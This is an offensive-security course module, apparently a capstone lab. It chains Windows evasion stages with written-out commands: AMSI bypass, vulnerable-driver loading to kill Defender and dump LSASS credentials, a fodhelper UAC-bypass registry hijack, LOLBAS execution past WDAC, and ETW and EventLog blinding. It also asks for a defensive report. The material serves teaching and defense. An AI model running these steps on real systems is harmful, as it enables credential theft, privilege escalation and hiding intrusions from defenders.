## Day 7: Full Chain Capstone - Breaking All Windows Security Boundaries

- **Goal**: Integrate techniques from Days 1–6 into a complete operational chain that bypasses every Windows security boundary covered this week. Demonstrate that these boundaries are **layered** - each must be defeated in sequence.
- **Activities**:
  - _Reading_:
    - [Microsoft - Windows Security Stack Overview](https://learn.microsoft.com/en-us/windows/security/) - Complete picture of layered defense
    - [SpecterOps - DVCP](https://specterops.io/blog/category/research/)
    - [MITRE ATT&CK Defense Evasion](https://attack.mitre.org/tactics/TA0005/) - Technique mapping
    - [ZDI Blog](https://www.zerodayinitiative.com/blog)
  - _Online Resources_:
    - [DEF CON 33 - Red Team Ops](https://www.youtube.com/results?search_query=defcon+33+red+team) - Modern red team chains
  - _Exercise_:
    - Build and execute a complete multi-stage chain
    - Document each stage's purpose and fallback options
    - Present chain to class with defensive recommendations
    - Prepare report mapping chain to MITRE ATT&CK

### The Full Chain: Days 1–6 in Sequence

```text
┌────────────────────────────────────────────────────────────────────────────┐
│              WEEK 7 FULL CHAIN - DEFEATING WINDOWS SECURITY BOUNDARIES     │
│                         (Based on Tested Tools)                            │
├────────────────────────────────────────────────────────────────────────────┤
│                                                                            │
│  STAGE 1: RECON (Day 1)                                                    │
│  ═══════════════════════                                                   │
│  │ Tools: unified_recon.exe, etw_architecture.exe, driver_ioctl_lab.exe    │
│  │ ├── Identify: Defender, EDR, Sysmon (31 ETW sessions found)             │
│  │ ├── Enumerate: VBS/HVCI, PPL processes, BYOVD drivers                   │
│  │ ├── Found: RTCore64 + BdApiUtil64 accessible                            │
│  │ └── Output: Attack plan tailored to THIS target                         │
│  │                                                                         │
│  ▼                                                                         │
│  STAGE 2: AMSI BYPASS (Day 2)                                              │
│  ═════════════════════════════                                             │
│  │ Tool: amsi_bypass_multi.exe                                             │
│  │ ├── Patch AmsiScanBuffer in current process                             │
│  │ ├── Or: Unhook amsi.dll via KnownDlls/suspended process                 │
│  │ └── Output: PowerShell/.NET runs without content inspection             │
│  │                                                                         │
│  │ WHY NOW: Need uninspected script execution for next stages              │
│  │ REALITY: Still work, but EDR may detect VirtualProtect                  │
│  │                                                                         │
│  ▼                                                                         │
│  STAGE 3: PPL BYPASS (Day 3) - REQUIRES ADMIN FIRST!                       │
│  ═════════════════════════════════════════════════════════                 │
│  │ Tools: defender_killer.exe OR ppl_bypass_rtcore.exe                     │
│  │ ├── Load BYOVD driver (BdApiUtil64.sys or RTCore64.sys)                 │
│  │ ├── Option A: Kill Defender (MsMpEng.exe) then dump LSASS               │
│  │ ├── Option B: Strip PPL via EPROCESS patching, then dump                │
│  │ └── Output: lsass.dmp (48.2 MB tested), credentials extracted           │
│  │                                                                         │
│  │ WHY NOW: Need creds for lateral movement                                │
│  │ Requires admin to load driver! Must do Stage 4 FIRST if not admin       │
│  │ defender_killer.exe successfully killed MsMpEng + dumped LSASS          │
│  │                                                                         │
│  ▼                                                                         │
│  STAGE 4: TOKEN ESCALATION (Day 4)                                         │
│  ══════════════════════════════════════════════════════════════            │
│  │ Tools: PrintSpoofer, GodPotato, fodhelper UAC bypass                    │
│  │ ├── If SeImpersonate: Use Potato attack -> SYSTEM                        │
│  │ ├── If Medium+Admin: UAC bypass (fodhelper) -> High integrity            │
│  │ ├── If Low integrity: Sandbox escape first                              │
│  │ └── Output: SYSTEM or High-integrity execution context                  │
│  │                                                                         │
│  │ WHY NOW: Need admin/SYSTEM to load BYOVD drivers (Stage 3)              │
│  │                                                                         │
│  ▼                                                                         │
│  STAGE 5: WDAC/ASR BYPASS (Day 5)                                          │
│  ══════════════════════════════════                                        │
│  │ Tools: MSBuild.exe, InstallUtil.exe (LOLBAS)                            │
│  │ ├── Use signed Windows binaries to execute despite WDAC                 │
│  │ ├── Bypass ASR rules via LOLBAS techniques                              │
│  │ ├── Deploy persistent payload past execution controls                   │
│  │ └── Output: Arbitrary code execution despite OS policy                  │
│  │                                                                         │
│  │ WHY NOW: Can now run our tools; need to blind telemetry                 │
│  │ REALITY: Some LOLBAS increasingly monitored, but still effective        │
│  │                                                                         │
│  ▼                                                                         │
│  STAGE 6: ETW BLINDING (Day 6)                                             │
│  ══════════════════════════════                                            │
│  │ Tool: etw_blinder_full.exe (TESTED AND WORKING)                         │
│  │ ├── Patch EtwEventWrite (usermode events) - VERIFIED                    │
│  │ ├── Suspend EventLog threads (Phant0m) - 4 threads suspended            │
│  │ ├── Attempt session manipulation - protected sessions blocked           │
│  │ └── Output: Usermode telemetry suppressed, EventLog frozen              │
│  │                                                                         │
│  │ WHY LAST: Must be in elevated context first (needs admin)               │
│  │ TESTED: etw_patch.exe proved 5 events before, 0 after (test.etl)        │
│  │ LIMITATION: Kernel ETW (TI provider) still active, requires BYOVD       │
│  │                                                                         │
│  ▼                                                                         │
│  OBJECTIVE ACHIEVED                                                        │
│  │ You now have:                                                           │
│  │ ├── Uninspected script execution (AMSI bypassed)                        │
│  │ ├── Credentials (PPL/LSASS bypassed via BYOVD)                          │
│  │ ├── SYSTEM context (token escalation)                                   │
│  │ ├── Arbitrary code execution (WDAC/ASR bypassed via LOLBAS)             │
│  │ └── Usermode telemetry suppressed (ETW patched, EventLog frozen)        │
│  │                                                                         │
│  │                                                                         │
│  │ CORRECTED CHAIN ORDER:                                                  │
│  │ Stage 1 (Recon) -> Stage 2 (AMSI) -> Stage 4 (Escalate to admin) ->     │
│  │ Stage 3 (PPL bypass with BYOVD) -> Stage 5 (WDAC) -> Stage 6 (ETW)      │
│  │                                                                         │
│  │                                                                         │
└────────────────────────────────────────────────────────────────────────────┘
```

### Capstone Assignment

#### Part A: Chain Design Document

Write a detailed operational plan that chains Days 1–6 techniques against a target Windows 11 workstation with:

- Windows Defender ATP enabled
- Sysmon with full logging
- WDAC in enforcement mode (default Microsoft policy)
- ASR rules in block mode
- PPL on Defender and LSASS

Your plan must include:

1. **Reconnaissance phase**: What do you enumerate first and how?
2. **Technique selection**: For each stage, which specific technique and why?
3. **Order justification**: Why this sequence? What breaks if you reorder?
4. **Fallback options**: If technique X fails at stage Y, what's plan B?
5. **MITRE ATT&CK mapping**: Map each stage to ATT&CK technique IDs

#### Part B: Practical Execution

Execute your chain in the lab environment using the ACTUAL TOOLS from Week 7:

Steps (using ACTUAL TESTED TOOLS from Week 7):

1. **Stage 1 - Recon**: Run Day 1 reconnaissance tools

   ```bash
   # System-level mitigation fingerprinting
   C:\Windows_Mitigations_Lab\bin\unified_recon.exe

   # ETW session enumeration (31 active sessions detected in testing)
   C:\Windows_Mitigations_Lab\bin\etw_architecture.exe

   # BYOVD driver detection (found RTCore64 and BdApiUtil64 in testing)
   C:\Windows_Mitigations_Lab\bin\driver_ioctl_lab.exe

   # MOTW status check
   C:\Windows_Mitigations_Lab\bin\motw_recon.exe check <downloaded_file>
   ```

   Document: VBS/HVCI status, AV/EDR processes, Sysmon, ETW sessions, BYOVD drivers, WDAC/ASR rules

2. **Stage 2 - AMSI**: Deploy AMSI bypass (Day 2 amsi_bypass_multi.c)

   ```bash
   # Test AMSI status first
   powershell -c "'AmsiScanBuffer'"  # Should trigger if AMSI active

   # Run AMSI bypass tool (patches EtwEventWrite, AmsiScanBuffer)
   C:\Windows_Mitigations_Lab\bin\amsi_bypass_multi.exe

   # Verify bypass
   powershell -c "[System.Management.Automation.AmsiUtils]"  # Should NOT alert
   ```

   Tool includes: Reflection bypass, memory patching, unhooking techniques

3. **Stage 3 - PPL**: Execute PPL bypass to dump LSASS (Day 3 tools)

   ```bash
   # Check PPL status
   C:\Windows_Mitigations_Lab\bin\ppl_checker.exe
   reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL

   # Option A: Kill Defender + dump LSASS (BdApiUtil64.sys)
   C:\Windows_Mitigations_Lab\bin\defender_killer.exe
   # Kills MsMpEng.exe (PPL-Antimalware), then dumps LSASS

   # Option B: EPROCESS patching (RTCore64.sys)
   C:\Windows_Mitigations_Lab\bin\ppl_bypass_rtcore.exe
   # Strips PPL protection via kernel memory write

   # Parse credentials
   pypykatz lsa minidump lsass.dmp
   ```

   Both methods tested and working in lab environment

4. **Stage 4 - Escalation**: Demonstrate token manipulation (Day 4 concepts)

   ```bash
   # Check current privileges
   whoami /priv | findstr SeImpersonate

   # If SeImpersonate available:
   # Use PrintSpoofer, GodPotato, or JuicyPotato

   # If UAC bypass needed:
   # fodhelper.exe registry hijack
   reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "cmd.exe" /f
   fodhelper.exe

   # Verify SYSTEM access
   whoami  # Should show NT AUTHORITY\SYSTEM
   ```

5. **Stage 5 - WDAC/ASR**: Execute code past WDAC using LOLBAS (Day 5 techniques)

   ```bash
   # Check WDAC status
   reg query HKLM\SYSTEM\CurrentControlSet\Control\CI /v UMCIAuditMode
   dir C:\Windows\System32\CodeIntegrity\CiPolicies\Active\

   # LOLBAS bypass examples:
   # MSBuild inline C# task
   C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.csproj

   # InstallUtil assembly loading
   C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.dll

   # Verify execution despite WDAC enforcement
   ```

6. **Stage 6 - ETW**: Blind telemetry with TESTED TOOLS (Day 6 - all working!)

   ```bash
   # Option A: Full blinding tool (combines all techniques)
   C:\Windows_Mitigations_Lab\bin\etw_blinder_full.exe
   # Expected output (from actual testing):
   #   [+] EtwEventWrite patched and verified
   #   [+] Suspended 4 wevtsvc.dll threads
   #   [+] EventLog FROZEN (3 sec test)
   #   [-] Protected sessions blocked (expected)

   # Option B: Individual techniques
   # Patch EtwEventWrite only
   C:\Windows_Mitigations_Lab\bin\etw_patch.exe
   # Creates test.etl: 5 events before patch, 0 after (VERIFIED)

   # Session tampering
   C:\Windows_Mitigations_Lab\bin\etw_session_tamper.exe
   # Phant0m thread suspension

   # TI ETW analysis
   C:\Windows_Mitigations_Lab\bin\ti_etw_analysis.exe
   # Demonstrates kernel-level ETW evasion

   # Verify blinding
   tracerpt test.etl -o test.xml -of XML
   notepad test.xml  # Should show event gap
   ```

   All tools compiled with: `cl <source>.c /Fe:bin\<tool>.exe advapi32.lib`

#### Part C: Defensive Report

For each stage of your chain, write:

1. What detection would have caught this technique?
2. What hardening would have prevented it?
3. What's the cost/benefit of each defensive measure?
4. Which single defense, if perfect, would break the most chains?

### Week 7 -> Week 8 Bridge

```text
┌────────────────────────────────────────────────────────────────┐
│                WEEK 7 -> WEEK 8 TRANSITION                     │
├────────────────────────────────────────────────────────────────┤
│                                                                │
│  WEEK 7 ANSWERED:                                              │
│  "Can my code RUN on this system?"                             │
│  ├── AMSI: Can my script execute without inspection?           │
│  ├── PPL: Can I access protected processes?                    │
│  ├── Sandbox: Can I escape my restricted context?              │
│  ├── WDAC/ASR: Does the OS allow my binary/behavior?           │
│  └── ETW: Can I operate without generating alerts?             │
│                                                                │
│  WEEK 8 WILL ANSWER:                                           │
│  "Can my EXPLOIT succeed at the binary level?"                 │
│  ├── DEP: Can I execute my shellcode? (ROP/JOP)                │
│  ├── ASLR: Can I find my gadgets? (Info leaks)                 │
│  ├── Stack cookies: Can I corrupt the stack? (Canary bypass)   │
│  ├── CFG/XFG: Can I hijack control flow? (Policy bypass)       │
│  └── CET/Shadow Stack: Can I forge return addresses?           │
│                                                                │
│  RELATIONSHIP:                                                 │
│  Week 7 = OS policy layer (execution control)                  │
│  Week 8 = Binary protection layer (exploit mitigations)        │
│  You need BOTH to succeed in a real engagement.                │
│                                                                │
│  EXAMPLE:                                                      │
│  1. Week 7: Bypass WDAC to load your exploit binary            │
│  2. Week 8: Your exploit binary must bypass DEP+ASLR+CFG       │
│     to actually achieve code execution inside the target app   │
│                                                                │
└────────────────────────────────────────────────────────────────┘
```

### Capstone Project

Build a full attack chain that defeats all six Windows security boundaries in sequence. Your deliverable should include:

1. A working exploit chain that progresses through all stages (recon -> AMSI bypass -> credential theft -> privilege escalation -> WDAC bypass -> ETW blinding)
2. A defensive report identifying detection opportunities at each stage with specific Sysmon/SIGMA rules
3. Documentation explaining which single defensive control would break your entire chain and why

Test your chain in an isolated Windows 11 lab VM. Document what worked, what failed, and how you adapted when defenses blocked your initial approach.

### Key Takeaways

- **Security boundaries are layered** - each must be defeated individually
- **Order matters** - you can't blind ETW before you have elevated execution
- **No single bypass is sufficient** - a full operation requires chaining all stages
- **Defensive depth works** - but each layer has known bypass techniques
- **Week 7 is the OS policy layer** - Week 8 addresses the binary protection layer
- **Chain thinking** is the core red team skill - isolated techniques are meaningless without integration
- **We built REAL TOOLS** - etw_blinder_full.exe, driver_ioctl_lab.exe, etc. are TESTED and WORKING
- **Reality Check** - Some techniques still work (usermode patching, Phant0m), others are harder (session tampering, kernel access)
- **BYOVD is critical** - driver_ioctl_lab.exe shows RTCore64/BdApiUtil64 detection and IOCTL structure
- **Verification is key** - Every stage has concrete proof (test.etl files, suspended threads, event log gaps)

### Discussion Questions

1. Which stage of the chain is the hardest to execute? Which is hardest to detect?
2. If you could only fix ONE defensive boundary to break the most chains, which would it be?
3. How does the chain change on a domain-joined enterprise workstation vs. a standalone system?
4. What would a "zero-trust" version of this chain look like - assuming every stage is monitored?
5. How does cloud-based detection (Defender ATP cloud) change the ETW blinding calculus?
6. Map this chain to a real APT group's TTPs - which group operates most similarly?
7. **NEW**: Why does etw_blinder_full.exe suspend wevtsvc.dll threads instead of killing the EventLog service?
8. **NEW**: The driver_ioctl_lab.exe tool detected RTCore64 and BdApiUtil64 - which stage of the chain would use these drivers and why?
9. **NEW**: We tested that usermode ETW patching still works in 2026 - what's the defensive gap that allows this?
10. **NEW**: If you run etw_blinder_full.exe and see "Protected sessions blocked", what does this tell you about the target's security posture?

